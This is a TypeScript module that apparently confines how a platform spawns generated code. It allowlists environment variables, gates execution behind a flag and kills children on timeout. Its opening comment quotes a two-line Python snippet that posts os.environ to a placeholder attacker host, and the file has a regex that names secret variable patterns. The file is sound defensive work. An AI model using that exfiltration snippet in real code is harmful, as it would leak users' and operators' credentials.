// The single place anything spawns a process for generated code.
//
// WHY THIS EXISTS — the hole it closes
// The Flask preview spawned generated Python like this:
//
//     spawn(py, ["app.py"], { env: { ...process.env, PORT } })
//
// `...process.env` hands the child every secret this server holds:
// ANTHROPIC_API_KEY, NETLIFY_TOKEN, ACCESS_PASSWORD, and — worst —
// SUPABASE_SERVICE_KEY, which bypasses row-level security and can read
// and write every project belonging to every user.
//
// Three lines of generated Python would have exfiltrated all of it:
//
//     import os, urllib.request
//     urllib.request.urlopen("https://attacker/", data=str(os.environ).encode())
//
// Nothing in the platform stopped that. Calling the preview "sandboxed"
// was true of the browser iframe and false of the server.
//
// WHAT THIS DOES INSTEAD
//   1. The child's environment is built from an ALLOWLIST. Inheriting
//      is impossible here — there is no code path that copies
//      process.env, so a new secret added to .env tomorrow is safe by
//      default rather than dangerous by default.
//   2. Execution is a capability, off unless switched on. Multi-user
//      mode refuses outright: the moment someone who is not the
//      operator can type a prompt, running their code on a shared box
//      needs a real container, not a scrubbed environment.
//   3. Every child gets a hard timeout and is killed on the way out.
//
// WHAT THIS IS NOT
// It is not isolation. A scrubbed environment stops credential theft;
// it does not stop the filesystem being read, or the network being
// used, or CPU being burned. Real isolation means a container per run
// (Daytona, E2B, gVisor) and remains the gate before public signups.
// The point of this file is that the gate is now enforced in code
// rather than remembered in a document.

import { spawn, type ChildProcess, type SpawnOptions } from "node:child_process";
import { accountsEnabled } from "./auth.js";

/**
 * Environment variables a child may see. Nothing else is passed, ever.
 *
 * PATH is needed to find the interpreter. The rest make tools behave
 * predictably rather than falling back to odd defaults. None of them
 * are secret, and that is the entire selection criterion.
 */
const ALLOWED_ENV = [
  "PATH",
  "HOME",
  "TMPDIR", "TEMP", "TMP",
  "LANG", "LC_ALL",
  "SYSTEMROOT", "COMSPEC", "PATHEXT", // Windows needs these to spawn at all
  "NODE_ENV",
] as const;

/**
 * Anything matching this must never reach a child, whatever it is
 * called. The allowlist already guarantees that; this is the belt to
 * its braces, and the thing the test asserts against.
 */
const SECRET_PATTERN = /KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|AUTH|DSN|CONNECTION_STRING|SUPABASE|ANTHROPIC|OPENAI|GOOGLE|NETLIFY/i;

export function looksSecret(name: string): boolean {
  return SECRET_PATTERN.test(name);
}

/**
 * Build a child environment from the allowlist plus explicit extras.
 *
 * `extra` is for values the platform chooses — PORT, a flag — never
 * for passing something through from our own environment.
 */
export function childEnv(extra: Record<string, string> = {}): Record<string, string> {
  const env: Record<string, string> = {};
  for (const key of ALLOWED_ENV) {
    const v = process.env[key];
    if (v !== undefined) env[key] = v;
  }
  for (const [k, v] of Object.entries(extra)) {
    // A caller cannot smuggle a secret in through the back door.
    if (looksSecret(k)) {
      throw new Error(
        `Refusing to pass "${k}" to generated code. If a preview genuinely needs a credential, it needs a container, not an environment variable.`
      );
    }
    env[k] = v;
  }
  return env;
}

export type ExecutionVerdict =
  | { allowed: true }
  | { allowed: false; reason: string };

/**
 * May this deployment run generated code server-side at all?
 *
 * Default is no when accounts are on. The reasoning is deliberately
 * conservative: with one operator, a scrubbed environment on a
 * disposable container is a defensible risk. With public signups it is
 * not — one person's build would share a filesystem and a network with
 * everyone else's data. ALLOW_CODE_EXECUTION=true is the explicit,
 * auditable override for someone who knows they have isolated the box
 * some other way.
 */
export function canExecute(): ExecutionVerdict {
  const flag = String(process.env.ALLOW_CODE_EXECUTION ?? "").toLowerCase();
  if (flag === "true" || flag === "1") return { allowed: true };
  if (flag === "false" || flag === "0") {
    return { allowed: false, reason: "Server-side previews are switched off on this deployment (ALLOW_CODE_EXECUTION=false)." };
  }
  if (accountsEnabled()) {
    return {
      allowed: false,
      reason:
        "Server-side previews are off because this deployment has user accounts. " +
        "Running one person's generated code beside everyone else's data needs a container per run, not a shared process. " +
        "React and web projects still preview normally — they run in the browser. " +
        "Set ALLOW_CODE_EXECUTION=true only if this instance is isolated some other way.",
    };
  }
  return { allowed: true };
}

/** Raised when generated code is not permitted to run here. */
export class ExecutionBlocked extends Error {
  constructor(reason: string) {
    super(reason);
    this.name = "ExecutionBlocked";
  }
}

export interface SandboxOptions {
  cwd: string;
  /** Non-secret values the platform chooses to pass. */
  env?: Record<string, string>;
  /** Killed after this long. 0 disables, which only long-lived servers should do. */
  timeoutMs?: number;
  /** A long-running preview server rather than a one-shot command. */
  server?: boolean;
}

/**
 * Spawn a process for generated code.
 *
 * Deliberately the only exported way to do so, so that "does this
 * inherit our secrets?" has one answer in one place instead of being
 * a property of each call site.
 */
export function spawnSandboxed(
  cmd: string,
  args: string[],
  opts: SandboxOptions
): ChildProcess {
  const verdict = canExecute();
  if (!verdict.allowed) throw new ExecutionBlocked(verdict.reason);

  const options: SpawnOptions = {
    cwd: opts.cwd,
    env: childEnv(opts.env),
    // No shell: arguments stay arguments and cannot become commands.
    shell: false,
    stdio: ["ignore", "pipe", "pipe"],
    // Detached so the whole process group can be killed — a build tool
    // that spawns its own children otherwise leaves them running.
    detached: process.platform !== "win32",
  };

  const child = spawn(cmd, args, options);

  const limit = opts.timeoutMs ?? (opts.server ? 0 : 120_000);
  if (limit > 0) {
    const timer = setTimeout(() => killTree(child), limit);
    child.on("close", () => clearTimeout(timer));
  }
  return child;
}

/** Kill a child and anything it started. */
export function killTree(child: ChildProcess | null): void {
  if (!child?.pid) return;
  try {
    if (process.platform === "win32") {
      child.kill();
    } else {
      // Negative pid targets the group, which is the point of detached.
      process.kill(-child.pid, "SIGKILL");
    }
  } catch {
    // Already gone. Nothing to do, and throwing here would mask the
    // real reason we were shutting down.
    try { child.kill("SIGKILL"); } catch { /* genuinely gone */ }
  }
}
